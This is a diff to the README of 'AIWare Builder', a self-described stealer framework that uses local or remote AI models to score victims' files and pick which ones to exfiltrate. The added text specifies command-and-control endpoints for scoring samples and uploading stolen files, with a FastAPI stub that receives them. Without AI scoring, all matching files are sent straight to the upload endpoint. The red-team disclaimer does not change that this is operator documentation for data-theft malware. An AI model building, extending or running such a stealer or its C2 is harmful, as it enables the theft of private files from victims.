@@ -1,5 +1,7 @@
 # AIWare Builder v2
 
+![Application Interface](screen.png)
+
 ## Overview
 AIWare is an advanced intelligent stealer framework that uses AI models (local or remote) to analyze and prioritize file exfiltration based on actual content value, rather than static file extension filtering. Designed for Red Teams, researchers, and educational labs.
 
@@ -48,17 +50,54 @@ bin/Debug/net8.0-windows/AIWareBuilder.exe
    - System.Net.Http
 3. Compile the project (Release mode recommended)
 
-## C2 Server (Optional)
-If using remote AI analysis:
-1. Deploy a lightweight API endpoint capable of accepting file samples
-2. Connect the endpoint to your LLM backend for classification scoring
-3. Return JSON structured responses:
+## C2 Server Configuration
+
+### Required Endpoints
+The C2 server must implement these endpoints:
+
+1. `/analyze` - For AI scoring of file samples
+   - Method: POST
+   - Request: Raw file sample bytes in request body
+   - Response:
 ```json
-{ 
-  "score": 87, 
-  "verdict": "valuable" 
+{
+  "score": 0-100, 
+  "verdict": "valuable|normal|junk"
 }
 ```
+
+2. `/upload` - For full file exfiltration  
+   - Method: POST
+   - Request: Multipart form with file data
+   - Response: 
+```json
+{
+  "status": "ok|error"
+}
+```
+
+### Example FastAPI Implementation
+```python
+from fastapi import FastAPI, UploadFile
+
+app = FastAPI()
+
+@app.post("/analyze")
+async def analyze_sample(sample: bytes):
+    # Implement your AI scoring logic here
+    return {"score": 90, "verdict": "valuable"}
+
+@app.post("/upload") 
+async def upload_file(file: UploadFile):
+    # Save received file
+    return {"status": "ok"}
+```
+
+### Without AI Analysis
+If no AI API is configured:
+- Files bypass the `/analyze` endpoint
+- All matching files are sent directly to `/upload`
+- Basic file extension filtering still applies
 
 ## Disclaimer
 This tool is provided strictly for educational, red teaming, and authorized research purposes only. Unauthorized use against systems without explicit permission is illegal and unethical.
